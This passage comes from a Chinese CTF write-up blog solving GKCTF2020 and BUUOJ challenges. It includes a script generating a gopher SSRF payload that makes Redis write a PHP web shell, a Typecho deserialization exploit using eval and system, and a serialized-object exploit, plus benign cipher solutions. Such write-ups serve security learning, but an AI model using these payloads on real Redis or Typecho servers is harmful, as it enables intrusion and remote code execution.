class="keyword">in</span> range(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">    u = temp.format(url, ip.format(i))</span><br><span class="line">    resp = requests.get(u)</span><br><span class="line">    <span class="keyword">if</span> len(resp.content) != <span class="number">445</span>:</span><br><span class="line">        print(i)</span><br><span class="line">//跑出来的结果不唯一，挨个试一下，试出来是<span class="number">11</span></span><br></pre></td></tr></table></figure><p>提交，提示端口，可以用脚本来跑，也可以用burp，端口是6379</p><p>redis</p><p>构造gophar:getshell脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">protocol=<span class="string">"gopher://"</span></span><br><span class="line"></span><br><span class="line">ip=<span class="string">"173.235.107.11"</span></span><br><span class="line"></span><br><span class="line">port=<span class="string">"6379"</span></span><br><span class="line"></span><br><span class="line">shell=<span class="string">"\n\n&lt;?php system(\"cat /flag\");?&gt;\n\n"</span></span><br><span class="line"></span><br><span class="line">filename=<span class="string">"shell.php"</span></span><br><span class="line"></span><br><span class="line">path=<span class="string">"/var/www/html"</span></span><br><span class="line"></span><br><span class="line">passwd=<span class="string">""</span></span><br><span class="line"></span><br><span class="line">cmd=[<span class="string">"flushall"</span>,</span><br><span class="line"></span><br><span class="line">     <span class="string">"set 1 &#123;&#125;"</span>.format(shell.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)),</span><br><span class="line"></span><br><span class="line">     <span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line"></span><br><span class="line">     <span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line"></span><br><span class="line">     <span class="string">"save"</span></span><br><span class="line"></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">    CRLF=<span class="string">"\r\n"</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">    cmd=<span class="string">""</span></span><br><span class="line">    cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.quote(redis_format(x))</span><br><span class="line">    <span class="keyword">print</span> payload</span><br><span class="line"><span class="comment">#########################################################################################</span></span><br><span class="line">gopher://<span class="number">173.235</span><span class="number">.107</span><span class="number">.11</span>:<span class="number">6379</span>/_%<span class="number">2</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">248</span>%<span class="number">0</span>D%<span class="number">0</span>Aflushall%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A3%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">241</span>%<span class="number">0</span>D%<span class="number">0</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2432</span>%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">3</span>C%<span class="number">3</span>Fphp%<span class="number">20</span>system%<span class="number">28</span>%<span class="number">22</span>cat%<span class="number">20</span>/flag%<span class="number">22</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A4%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">246</span>%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Adir%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2413</span>%<span class="number">0</span>D%<span class="number">0</span>A/var/www/html%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A4%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">246</span>%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2410</span>%<span class="number">0</span>D%<span class="number">0</span>Adbfilename%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">249</span>%<span class="number">0</span>D%<span class="number">0</span>Ashell.php%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">244</span>%<span class="number">0</span>D%<span class="number">0</span>Asave%<span class="number">0</span>D%<span class="number">0</span>A</span><br></pre></td></tr></table></figure><p>跑出来的打上去，再访问shell.php即可getflag</p><h4 id="GKCTF2020-EZ三剑客-EzTypecho"><a href="#GKCTF2020-EZ三剑客-EzTypecho" class="headerlink" title="[GKCTF2020]EZ三剑客-EzTypecho"></a>[GKCTF2020]EZ三剑客-EzTypecho</h4><p>下载源码，找到利用的点，在start</p><img src="/2020/05/24/GKCTF/7.png" class=""><p>typecho反序列化，google一下，找到exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_type;</span><br><span class="line">    <span class="keyword">private</span> $_items = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_type = <span class="string">"RSS 2.0"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items = <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">"title"</span> =&gt; <span class="string">"test"</span>,</span><br><span class="line">                <span class="string">"link"</span> =&gt; <span class="string">"test"</span>,</span><br><span class="line">                <span class="string">"data"</span> =&gt; <span class="string">"20190430"</span>,</span><br><span class="line">                <span class="string">"author"</span> =&gt; <span class="keyword">new</span> Typecho_Request(),</span><br><span class="line">            ),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">"screenName"</span> =&gt; <span class="string">"eval('system(\'cat /flag\');exit;')"</span>,</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>(<span class="string">"assert"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Typecho_Feed();</span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"adapter"</span> =&gt; $a,</span><br><span class="line">    <span class="string">"prefix"</span> =&gt; <span class="string">"test"</span>,</span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($c));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo0OntzOjU6InRpdGxlIjtzOjQ6InRlc3QiO3M6NDoibGluayI7czo0OiJ0ZXN0IjtzOjQ6ImRhdGEiO3M6ODoiMjAxOTA0MzAiO3M6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjM1OiJldmFsKCdzeXN0ZW0oXCdjYXQgL2ZsYWdcJyk7ZXhpdDsnKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NDoidGVzdCI7fQ==</span></span><br></pre></td></tr></table></figure><p>直接打cookie过去或者post，改一下referer，getflag</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h4 id="GKCTF2020-小学生的密码学"><a href="#GKCTF2020-小学生的密码学" class="headerlink" title="[GKCTF2020]小学生的密码学"></a>[GKCTF2020]小学生的密码学</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e(x)=<span class="number">11</span>x+<span class="number">6</span>(mod26)</span><br><span class="line">密文：welcylk</span><br></pre></td></tr></table></figure><p>仿射密码，直接脚本解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        k = a //b</span><br><span class="line">        remainder = a % b</span><br><span class="line">        x1, y1 = get(b, remainder)</span><br><span class="line">        x, y =y1, x1 - k * y1</span><br><span class="line">    <span class="keyword">return</span> x, y</span><br><span class="line">s = input(<span class="string">"请输入解密字符："</span>).upper()</span><br><span class="line">a = int(input(<span class="string">"请输入a："</span>))</span><br><span class="line">b = int(input(<span class="string">"请输入b："</span>))</span><br><span class="line"><span class="comment">#求a关于26的乘法逆元</span></span><br><span class="line">x, y = get(a, <span class="number">26</span>)</span><br><span class="line">a1 = x % <span class="number">26</span></span><br><span class="line">l= len(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(l):</span><br><span class="line">    cipher = a1 * (ord(s[i])- <span class="number">65</span> - b) % <span class="number">26</span></span><br><span class="line">    res=chr(cipher + <span class="number">65</span>)</span><br><span class="line">    print(res, end=<span class="string">''</span>)</span><br><span class="line">    <span class="comment">#sorcery（解密字符）</span></span><br></pre></td></tr></table></figure><p>sorcery用base64加密包上flag即可</p><h4 id="GKCTF2020-汉字的秘密"><a href="#GKCTF2020-汉字的秘密" class="headerlink" title="[GKCTF2020]汉字的秘密"></a>[GKCTF2020]汉字的秘密</h4><p>当铺密码+ascii转字符</p><p>字符挨个+下标位置即为flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> GK！！ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuoj3</title>
      <link href="/2020/05/16/buuoj3/"/>
      <url>/2020/05/16/buuoj3/</url>
      
        <content type="html"><![CDATA[<h4 id="0X01：-网鼎杯-2020-青龙组-AreUSerialz"><a href="#0X01：-网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="0X01：[网鼎杯 2020 青龙组]AreUSerialz"></a>0X01：[网鼎杯 2020 青龙组]AreUSerialz<a id="more"></a></h4><p>这道题当天比赛的时候就大概看了一下，现在buu上复现了发现也不是很难，来看看吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化，对传入的str参数进行反序列化，字符的ASCII都要在32~125之间</p><p>反序列化会调用__destruct析构方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>从代码中可以看到，===是强比较，也就是说字符值和类型都要相同，如果不同就进入process()函数中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>从这可以看到，我们想要读取文件，那么op的值要为2，刚好这里是用的若比较，直接让op=2</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       $res = <span class="string">""</span>;</span><br><span class="line">       <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">           $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> $res;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>read函数中的filename是可控的，赋值为flag.php，再以output函数输出</p><p>这里有个问题，protect对象序列化时会有%00,%00对应的ascii值为0不在那个范围内，找资料发现php7.1对于属性类型不敏感，改为public</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $op=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">"flag.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">//O:11:"FileHandler":3:&#123;s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;&#125;</span></span><br></pre></td></tr></table></figure><p>给str传入序列化数据，在源码处找到flag</p><h4 id="0X02：-网鼎杯-2018-Comment"><a href="#0X02：-网鼎杯-2018-Comment" class="headerlink" title="0X02：[网鼎杯 2018]Comment"></a>0X02：[网鼎杯 2018]Comment</h4><p>打开是一个留言板界面，F12找到提示：程序员GIT写一半跑路了,都没来得及Commit :)</p><p>用githack找到文件，但是只显示了一部分，看了wp，用的wyh师傅的githack可以恢复，拿到了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"mysql.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>] != <span class="string">'yes'</span>)&#123;</span><br><span class="line">    header(<span class="string">"Location: ./login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">'do'</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'write'</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">'category'</span>]);<span class="comment">//第一次过滤</span></span><br><span class="line">    $title = addslashes($_POST[<span class="string">'title'</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into board</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                title = '$title',</span></span><br><span class="line"><span class="string">                content = '$content'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'comment'</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">'bo_id'</span>]);</span><br><span class="line">    $sql = <span class="string">"select category from board where id='$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = 